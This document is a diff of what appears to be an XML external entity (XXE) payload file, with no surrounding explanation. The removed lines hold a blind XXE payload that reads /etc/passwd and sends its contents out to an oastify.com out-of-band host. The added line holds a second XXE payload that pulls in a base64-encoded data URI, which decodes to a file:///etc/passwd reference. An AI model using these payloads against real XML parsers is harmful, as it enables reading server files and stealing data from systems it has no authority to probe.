@@ -1,6 +1,3 @@
 
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ELEMENT foo (#ANY)>
-<!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "https://tc91bso0lwoyjtxi2pz7r7lyepkg8hw6.oastify.com/?%xxe;">]><foo>&blind;</foo>
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
